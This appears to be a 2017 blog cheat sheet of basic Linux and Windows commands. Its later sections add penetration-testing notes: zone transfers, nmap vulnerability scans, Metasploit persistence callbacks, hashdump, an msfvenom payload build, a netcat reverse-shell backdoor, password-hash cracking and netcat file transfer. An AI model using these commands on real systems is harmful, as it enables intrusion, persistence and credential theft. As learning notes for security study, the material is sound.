---
layout: post
title: "Basics Cheat Sheet"
date: 2017-09-05
---
<p>
Here is a formatted list of basic commands. I used these as I was learning how to get my way around and added to the list as I learned new things. Writing them down helped me remember the syntax.
</p>
<h2> Get Help … and other info</h2>
<ul>
	<strong>
		<li><code>C:\&gt; &lt;command&gt; /? </code></li>
		<li><code>root@kl~# &lt;command&gt; -h </code></li>
		<li><code>root@kl~# &lt;command&gt; --help </code></li>
		<li><code>root@kl~# man &lt;command&gt; </code></li>
		<li><code>root@kl~# apropos </code></li>
		<li><code>root@kl~# history </code></li>
		<li><code>root@kl~# hostname</code></li>
		<li><code>root@kl~# sudo </code></li>
		<li><code>root@kl~# whoami </code></li>
	</strong>
			<ul>
				<li>(print current user id and name)</li>	
			</ul>
	<strong>
		<li><code>root@kl~# date </code></li> 
		<li><code>C:\>  chdir </code></li>
	</strong>
			<ul>
				<li>(displays location)</li>
			</ul>
	<strong>
		<li><code>root@kl~# pwd </code></li>
	</strong>
			<ul>
				<li>(displays location)</li>
			</ul>
</ul>

<h2>Processes and Things</h2>
<ul>
	<strong>
		<li><code>root@kl~# jobs </code></li>
	</strong>
			<ul>
				<li>(list cronjobs)</li>
			</ul>
	<strong>
		<li><code>root@kl~# kill </code></li>
	</strong>
			<ul>
				<li>(stop processes)</li>
			</ul>
	<strong>
		<li><code>root@kl~# pkill </code></li>
	</strong>
			<ul>
				<li>(stop processes)</li>
			</ul>
	<strong>	
		<li><code> root@kl~# ps –aef </code></li>
	</strong>
			<ul>
				<li>(list processes status)</li>
			</ul>
	<strong>
		<li><code>C:\ tasklist </code></li>
	</strong>
</ul>

<h2>Files</h2>
<ul>
	<strong>
		<li><code>root@kl~# cp &lt;src&gt; &lt;dst&gt; </code></li>
	</strong>
			<ul>		
				<li>(copy)</li>
			</ul>
	<strong>
		<li><code>C:\> copy  &lt;src&gt; &lt;dst&gt; </code></li>
		<li><code>root@kl~# clear </code></li>
		<li><code>C:\> cls </code></li>
		<li><code>C:\> dir </code></li>
		<li><code>root@kl~# echo &lt;message&gt; </code></li>
	</strong>
			<ul>
				<li>(print to screen)</li>
			</ul>		
	<strong>
		<li><code>root@kl~# find –iname &lt;file&gt; </code></li>
		<li><code>C:\> findstr /i /s &lt;string&gt; *.txt </code></li>
	</strong>
			<ul>
				<li>(like grep for Windows)</li>
			</ul>
	<strong>
		<li><code>root@kl~# file </code></li>
	</strong>
			<ul>
				<li>(determine file type)</li>
			</ul>
	<strong>
		<li><code>C:\> dir \ &lt;file&gt; /b /s </code></li>
		<li><code>root@kl~# grep </code></li>
	</strong>
			<ul>
				<li>(search files for matching text)</li>
			</ul>
	<strong>
			<li><code>root@kl~# gzip </code></li>
	</strong>
			<ul>
				<li>(compress or decompress files)</li>
			</ul>
	<strong>
		<li><code>root@kl~# less </code></li>
	</strong>
		<ul>
			<li>(display output one screen at a time)</li>
		</ul>
	<strong>
		<li><code>root@kl~# locate </code></li>
		<li><code>root@kl~# ls </code></li>
		<li><code>root@kl~# mkdir </code></li>
	</strong>
			<ul>
				<li>(new directory)</li>
			</ul>	
	<strong>
		<li><code>root@kl~# mv &lt;src&gt; &lt;dst&gt; </code></li>
	</strong>
			<ul>
				<li>(move/rename a file)</li>
			</ul>
	<strong>
		<li><code>C:\>  move &lt;src&gt; &lt;dst&gt; </code></li>
		<li><code>root@kl~# rm </code></li> 
	</strong>
			<ul>
				<li>(remove files)</li>
			</ul>	
	<strong>
		<li><code>C:\> ren </code></li>
	</strong>
			<ul>
				<li>(renames file)</li>
			</ul>	
	<strong>
		<li><code>root@kl~# umask </code></li>
	</strong>
			<ul>
				<li>(users file creation mask)</li>
			</ul>	
	<strong>
		<li><code>root@kl~# uniq </code></li>
	</strong>
			<ul>
				<li>(uniquify files)</li>
			</ul>
	<strong>
		<li><code>root@kl~# vi/vim </code></li>
	</strong>
			<ul>
				<li>(the best text editor)</li>
			</ul>	
	<strong>
		<li><code>root@kl~# wc </code></li>
	</strong>
			<ul>
				<li>(print byte, word and line counts)</li>
			</ul>	
	<strong>
		<li><code>root@kl~# whereis </code></li>
	</strong>
			<ul>
				<li>(search $path, man pages and source files for program)</li>
			</ul>	
</ul>
		
<h2>Users</h2>
<ul>
<strong>
	<li><code>root@kl~# chgrp </code></li>
</strong>
		<ul>
			<li>(change group ownership)</li>
		</ul>	
<strong>
	<li><code>root@kl~# chmod </code></li>
</strong>	
		<ul>
			<li>(change access permissions)</li>
		</ul> 
<strong>
	<li><code>root@kl~# chown </code></li>
</strong>	
		<ul>
			<li>(change file owner and group)</li>
		</ul>	
<strong>
	<li><code>root@kl~# groupadd </code></li>
</strong>	
		<ul>
			<li>(add a user to a security group)</li>
		</ul>	
<strong>
	<li><code>root@kl~# passwd </code></li>
</strong>	
		<ul>
			<li>(modify user password)</li>
		</ul>	
<strong>
	<li><code>root@kl~# useradd </code></li>
</strong>	
		<ul>
			<li>(create new users)</li>
		</ul>	
<strong>
	<li><code>root@kl~# usermod </code></li>
</strong>	
		<ul>
			<li>(modify user account)</li>
		</ul>	
<strong>
	<li><code>root@kl~# users </code></li>
</strong>	
		<ul>
			<li>(list logged in users)</li>
		</ul>
</ul>

<h2>Networks</h2>
<ul>
<strong>
	<li><code>root@kl~# curl </code></li>
</strong>
		<ul>
			<li>(grab webpages)</li>
		</ul>
<strong>
	<li><code>root@kl~# dig </code></li>
</strong>
		<ul>
		<li>(DNS lookup)</li>
		</ul>
<strong>
	<li><code>root@kl~# ifconfig </code></li>
	<li><code>root@kl~# netstat -ano/-plant/-uplant </code></li>
</strong>
		<ul>
			<li>(networking connections)</li>
		</ul>
<strong>
	<li><code>root@kl~# nslookup </code></li>
</strong>
		<ul>
			<li>(query name servers)</li>
		</ul>
<strong>
	<li><code>root@kl~# ping </code></li>
	<li><code>root@kl~# ssh </code></li>
	<li><code>root@kl~# traceroute </code></li>
	<li><code>root@kl~# wget </code></li>
</strong>
		<ul>
			<li>(get web pages or files)</li>
		</ul>
 </ul>
 <h1> please excuse my mess...still formatting. Had to go! </h1>
 
<h2>Reconnaissance</h2>
<ul>
<li><code>nslookup &lt;domain&gt; </code></li>
	<ul>
		<li>Discover target’s IP/FQDN domain</li>
	</ul>
<li><code>nslookup &lt;ip&gt; </code></li>
<li><code>root@kl~# dig &lt;domain&gt;  </code></li>
	<ul>
		<li>Find nameserver for known domain</li>
	</ul>
<li><code>root@kl~# dig axfr @&lt;name server&gt; &lt;domain&gt; </code></li>
	<ul>
		<li>perform a zone transfer to list hosts w/in domain</li>
	</ul>
<li><code>root@kl~# traceroute &lt;ip&gt; </code></li>
	<ul>
		<li>determine route to a host</li>
	</ul>
<li><code>C:\> tracert &lt;ip&gt; </code></li>
	<ul>
		<li>determine route to a host</li>
	</ul>
<li><code>root@kl~# nmap –sV –O &lt;ip&gt; </code></li>
	<ul>
		<li>scan for services and operating system</li>
	</ul>
<li><code>root@kl~# nmap --script=vulns &lt;ip&gt; </code></li>
	<ul>
		<li>scan for some old vulns</li>
	</ul>
	
<h2>Gain and Maintain</h2>
<li><code>root@kl~# ssh &lt;user&gt;@&lt;ip&gt; </code></li>
	<ul>
		<li>establish ssh connection</li>
	</ul>
<li><code>rdesktop -u &lt;username&gt; -p &lt;password&gt; &lt;ip&gt; </code></li>
<li><code>vncviewer &lt;ip&gt; </code></li>
	<ul>
		<li>remote desktop (rdesktop is port 3389 and vncviewer is 5900)</li>
	</ul>
<li>favorites from the msf console</li>
	<ul>
		<li><code>search &lt;keyword&gt;</code></li>
		<li><code>info &lt;module&gt; </code></li>
		<li><code>use &lt;module&gt;</code></li>
		<li><code>show options </code>(shows you what to fill in)</li>
		<li><code>show payloads </code>(shows payloads associated with the exploit you loaded)</li>
		<li><code>background </code>(use to background sessions)</li>
		<li><code>pwd vs lpwd & cd vs lcd </code></li>
		<li><code>sessions –i &lt;#&gt; </code> (to interact with sessions)</li>
		<li><code>run persistence –h </code></li>
		<li><code>run persistence –A –r &lt;your ip&gt; -p &lt;port&gt; -i 10 </code>(call back every 10 seconds if connection is lost)</li>
		<li><code>hashdump </code></li>
	</ul>
<li>add a route in msf</li>
	<ul>
		<li><code>route add &lt;victim subnet&gt; &lt;subnet mask&gt; &lt;session#&gt; </code></li>
		<li><code>route print</code></li>
	</ul>
<li>make a msfvenom payload for windows executable</li>
	<ul>
		<li><code>root@kl~# msfvenom –p &lt;payload&gt; lhost=&lt;ip&gt; lport=&lt;port&gt; -f exe –i 2 &gt; &lt;file&gt;.exe </code></li>
		<li><code>root@kl~# msfvenom –l encoders (for list of encoders)
	</ul>
<li>set up a listener in metasploit</li>
		<li><code>use exploit/multi/handler</code></li>
		<li><code>set payload</code></li>
		<li><code>set ExitOnSession false</code></li>
		<li><code>exploit –j (run as a job)</code></li>
<li>netcat backdoor</li>
	<li><code>root@kl~# nc –l –p &lt;port&gt; (on launch platform)</code></li>
	<li><code>C:\> start nc &lt;launch ip&gt; &lt;port&gt; -e cmd.exe</code></li>
</ul>			
			
<h2>Escalate and Propagate</h2>
<ul>
	<li>get passwords using meterpreter or shell (/etc/shadow or hashdump)</li>
	<li> use john to crack NT hashes – remember to add special words you find to the password list in john </li>
	<li><code>root@kl~# ./john &lt;file&gt; --format=nt </code></li>
<li>transfer files with netcat </li>
	<li><code>root@kl~#  nc –l –p &lt;port&gt; > &lt;file&gt; </code>(on your platform to listen for file)</li>
	<li><code>C:\> nc.exe &lt;your ip&gt; &lt;port&gt;  <  &lt;file to transfer&gt; </code></li>
<li>transfer files with python</li>
	<li><code>python –m SimpleHTTPServer <port> </code></li>
</ul>
